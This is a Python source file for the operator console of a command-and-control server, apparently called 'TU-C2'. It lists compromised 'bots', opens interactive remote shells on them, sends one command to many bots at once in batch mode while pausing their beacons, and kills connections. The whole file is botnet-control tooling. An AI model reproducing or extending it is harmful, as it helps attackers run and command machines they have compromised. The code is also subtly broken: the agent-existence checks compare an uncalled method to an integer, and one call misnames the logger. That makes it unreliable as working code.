# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time

class Interpreter(threading.Thread):
    def __init__(self, agentList, listeners, loggers):
        threading.Thread.__init__(self)     # Spawn a new thread for itself
        self.agentList = agentList
        self.listeners = listeners
        self.loggers = loggers

    def run(self):
        # Start of a command history implementation, put on hold by stuff
        # cmd_history = []
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Interpreter initialized and running')            

        # PRINT ALL AVAILABLE COMMANDS AND FUNCTIONS HERE
        self.printUsage()

        while True:
            cmd = str(input("[TU-C2:CONSOLE]$ "))
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Received command: "'+cmd+'"')            
            self.log_history(cmd)

            # TODO:
            # commands:
            #   - list-mods
            #   - info <bot-id>

            # Change this to case/switch statements; probs look cleaner


            if (cmd == "".strip(" ")):
                print("[* Interpreter-Msg] Error: No command received. Try again...")                
                self.loggers[0].q_log('serv','warning','[* Interpreter-Msg] Error: No command received')            
                pass
            elif (cmd.strip(" ") == "exit"):
                self.exit()
            elif (cmd.strip(" ") == "history"):
                self.printHistory()
            elif (cmd.strip(" ") == "clear"):
                os.system("clear")
                self.logger[0].q_log('serv','info','[* Interpreter-Msg] Screen cleared')
            elif (cmd.strip(" ") == "list-agents"):
                self.listAgents()
            elif (cmd.strip(" ") == "batch-mode"):
                self.batchMode()
            elif (cmd.strip(" ") == "help"):
                self.printUsage()
            elif (cmd.startswith("kill")):
                try:
                    # print(cmd)
                    arg_id = int(cmd.split()[1])
                    # print(arg_id)
                except Exception as ex:
                    print(f"[* Interpreter-Msg] Unable to process Agent ID entered...")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to process Agent ID for kill')            
                    print(f"[* Interpreter-Msg] Error: {ex}")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Error: '+str(ex))            

                else:
                    # Check if exists
                    agentFound = False
                    for agent in self.agentList:
                        if agent.getID == arg_id:
                            agentFound = True
                            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Agent '+str(arg_id)+' exists')

                    if agentFound:
                        try:
                            self.kill(arg_id)
                        except Exception as ex: 
                            print(f"[* Interpreter-Msg] Unable to kill connection with bot {arg_id}...")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to kill connection for Bot '+arg_id)            
                            print(f"[* Interpreter-Msg] Error: {ex}")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Error: '+str(ex))            
                    else:
                        print(f"[* Interpreter-Msg] Unable to kill connection with bot {arg_id}...")                        
                        print(f"[* Interpreter-Msg] Agent {arg_id} does not exist...\n")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to kill connection with Agent '+str(arg_id))
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Agent '+str(arg_id)+' does not exist') 

            elif (cmd.startswith("interact")):
                try:
                    # print(cmd)
                    arg_id = int(cmd.split()[1])
                    # print(arg_id)
                except Exception as ex:
                    print(f"[* Interpreter-Msg] Unable to process Bot ID entered...")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to process Bot ID entry')            
                    print(f"[* Interpreter-Msg] Error: {ex}")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Error: '+str(ex))            

                else:
                    # Check if exists
                    agentFound = False
                    for agent in self.agentList:
                        if agent.getID == arg_id:
                            agentFound = True
                            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Agent '+str(arg_id)+' exists')

                    if agentFound:
                        try:
                            self.interact(arg_id)
                        except Exception as ex: 
                            print(f"[* Interpreter-Msg] Unable to initiate interaction with bot {arg_id}...")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to initiate interaction with Bot '+str(arg_id))            
                            print(f"[* Interpreter-Msg] Error: {ex}")
                            self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Error: '+str(ex))
                    else:
                        print(f"[* Interpreter-Msg] Unable to initiate interaction with bot {arg_id}...")                        
                        print(f"[* Interpreter-Msg] Agent {arg_id} does not exist...\n")
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Unable to initiate interaction with Agent '+str(arg_id))
                        self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Agent '+str(arg_id)+' does not exist')            

            else:
                print("[* Interpreter-Msg] Unable to process command. Try again...")
                self.loggers[0].q_log('serv','warning','[* Interpreter-Msg] Unable to process command. Retrying...')

#------------------------------------------------------------------------------------------------------------------------------
    def printUsage(self):
        print('''
[* Interpreter-Msg] Usage information:\n
[+ COMMANDS +]
        SERVER:
        - help                          : Print this message
        - exit                          : Exits the program; Causes agents to sleep and retry every 10-45 seconds
        - clear                         : Clears the screen; Presents a fresh terminal
        - list-agents                   : Lists all active agents in use
        AGENTS:
        - interact <id>                 : Opens an interactive BASH/CMD prompt on the selected bot
        - kill <id>                     : Kill a connection to a specific bot. Causes bot process to exit. [* Will not recur *]
        MODULES:
        - list-modules <windows|linux>  : List all modules currently available to the user on the C2, seperated by operating system
        - load-module <module-name>     : Loads a module into the chamber       

        ''')
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Help message printed')
#------------------------------------------------------------------------------------------------------------------------------
    def batchMode(self):
 
        batchList = []

        os.system("clear")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Entering batch-mode, prompting for bot-list')

        print('''
[* Interpreter-Msg] Entering Batch-Mode execution...\n
[* Interpreter-Msg] Systems in use under this mode will each receive the same command each time you enter.
[* Interpreter-Msg] Enter QUIT into the terminal to exit batch-mode \n\n
        ''')

        bm_success = False
        bm_entry = ''

        # This loop is not good fix it << but it works
        while (not bm_success):
            if('quit'.casefold().strip(" ") in bm_entry):
                break
            else:    
                try:
                    bm_entry = input('[* Interpreter-Msg] Enter list of Bot-IDs to interact with (seperated by spaces): ')
                    idlist = [int(n) for n in bm_entry.split()]
                    print(f"[* Interpreter-Msg] ID list obtained: {str(idlist)}")
                    self.loggers[0].q_log('serv','error','[* Interpreter-Msg] Batch-mode ID list obtained: '+str(idlist))            

                except Exception as ex:
                    print(f"[* Interpreter-Msg] Unable to form list of IDs to add to BatchMode-list")
                    self.loggers[0].q_log('serv','error',('[* Interpreter-Msg] Unable to form list of IDs to add to BatchMode-list: ' + str(bm_entry)))
                    print(f"[* Interpreter-Msg] Error: {ex}")
                    self.loggers[0].q_log('serv','error',('[* Interpreter-Msg] Error: ' + str(ex)))

                    bm_success = False
                else:
                    for conn in self.agentList:
                        if conn.getID() in idlist:
                            batchList.append(conn)

                            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Stopping beacons for bots '+str(idlist)+' while in batch-mode')            
                            conn.stopBeacon()
                    bm_success = True

        time.sleep(0.3)

        if(bm_success):
            os.system("clear")
            print(f'''
[* Interpreter-Msg] Batch-Mode execution confirmed: 
[* Interpreter-Msg] The commands entered here will be sent to these Bots: {idlist}
[* Interpreter-Msg] Note that this mode will not allow for individual shell environment interaction\n
[* Interpreter-Msg] Enter Q or QUIT at any time to exit this mode
[* Interpreter-Msg] Enter EXIT at any time to exit the C2\n\n
            ''')

            batch_cmd = ""
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Initiating Batch-Mode prompt')

            while (True):
                batch_cmd = str(input("[TU-C2:BATCH-CMD]% "))
                self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Batch-Mode command received: '+batch_cmd)

                if(batch_cmd.casefold().strip(" ") == "quit" or batch_cmd.casefold().strip(" ") == "q" or batch_cmd.casefold().strip(" ") == "exit"):

                    # Reset beacon variable to continue
                    for conn in batchList:
                        conn.startBeacon()
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Restarting beacons')
                    batchList.clear()
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Cleaning Batch list')
                    break
                elif (batch_cmd.casefold().strip(" ") == "shell"):
                    print("[* Interpreter-Msg] Can't interact with individual shells in this environment")
                    print("[* Interpreter-Msg] Please exit if that is the desired result\n")
                    self.loggers[0].q_log('serv','warning','[* Interpreter-Msg] Attempted shell execution in batch-mode')
                    continue
                elif (batch_cmd.casefold().strip(" ") == "clear"):
                    os.system("clear")
                    self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Screen cleared')
      
                else:
                    try:
                        print(f"[+] Sending Command: {batch_cmd} to {str(len(batchList))} bots")
                        for conn in batchList:                                     
                            time.sleep(0.1)
                            print(f"[* BATCH-CMD] Bot #{conn.getID()} response: ")
                            print(conn.execute(batch_cmd))
                    except Exception as ex:
                        print("[* Interpreter-Msg] Error with sending command or receiving output")
                        self.loggers[0].q_log('serv','warning','[* Interpreter-Msg] Error with sending command or receiving output')
                        print(f"[* Interpreter-Msg] Error: {ex}")
                        self.loggers[0].q_log('serv','warning',('[* Interpreter-Msg] Error: ' + str(ex)))

        # RESET BEACON
        print(f"[* Interpreter-Msg] Exiting Batch-Mode... Returning to main-menu...")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Exiting Batch-Mode... Returning to main-menu...')


#------------------------------------------------------------------------------------------------------------------------------
    def exit(self):
        print(f"[* Interpreter-Msg] Closing connection to {str(len(self.agentList))} bots")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Closing connection to all bots')

        for agent in self.agentList:                                         
            time.sleep(0.1)
            agent.execute("exit")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] "exit" command sent to all active agents')

        print("[* Interpreter-Msg] Exiting connections for all bots. Please wait...")
        time.sleep(5)
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Exiting C2')       
        os._exit(0)
#------------------------------------------------------------------------------------------------------------------------------
    def listAgents(self): # Change to listAlive(self)
        print("       .------------------.                                    ")
        print("       |  LIST OF AGENTS  |                                    ")
        print(".------:------------------:--------.----------.------.--------.")
        print("|  ID  |  IP ADDRESS (v4) |  PORT  |    OS    | PING | BEACON |")
        print(":------:------------------:--------:----------:------:--------:")

        for agent in self.agentList:
            print("| %4d | %16s | %6d | %9s | %4s | %6s |"% (agent.getID(), agent.getIP(), agent.getPort(), agent.getOS(), agent.status[0], agent.status[1]))
            print(":------:------------------:--------:----------:------:--------:")
#------------------------------------------------------------------------------------------------------------------------------
    def interact(self, id):
        # print("Shell function entry point")
        print(f"[* Interpreter-Msg] Entering individual interaction with Bot #{id}.\n")
        print("[* Interpreter-Msg] Be mindful that this mode is quite loud.")
        print("[* Interpreter-Msg] A CMD.EXE process has been spawned...\n\n")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Entering individual interaction mode for Bot '+str(id))


        shellExecStatus = False
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Calling handler .shell() function')

        for agent in self.agentList:
            if agent.getID() == id:
                shellExecStatus = agent.shell()

        if shellExecStatus:
            print("[* Interpreter-Msg] Shell exited gracefully...\n")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Individual shell interaction mode for Bot '+str(id)+' exited successfully')

        else:
            print("[* Interpreter-Msg] Shell exited with errors...\n")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Individual shell interaction mode for Bot '+str(id)+' exited unsuccessfully')
#------------------------------------------------------------------------------------------------------------------------------
    def kill(self, id):
        print(f"[* Interpreter-Msg] Killing connection with Bot #{id}.\n")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Killing connection with bot '+str(id))

        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Calling handler .kill() function')
        for agent in self.agentList:
            if agent.getID() == id:
                killStatus = agent.kill()

        if killStatus:
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Removing bot '+str(id)+' from agent list')
            for agent in self.agentList:
                if agent.getID() == id:
                    self.agentList.remove(agent)
                    break
            print(f"[* Interpreter-Msg] Bot #{id} was killed peacefully...\n")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Bot '+str(id)+' was killed successfully')

        else:
            print(f"[* Interpreter-Msg] Bot #{id} was killed with errors...\n")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg] Bot '+str(id)+' was killed unsuccessfully')
#------------------------------------------------------------------------------------------------------------------------------
    def log_history(self, cmd):
        with open("log/.history", "a") as history:
            history.write(cmd+'\n')
#------------------------------------------------------------------------------------------------------------------------------ 
    def printHistory(self):
        with open("log/.history", 'r') as f:
            print(f.read())
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg] History printed')
#------------------------------------------------------------------------------------------------------------------------------
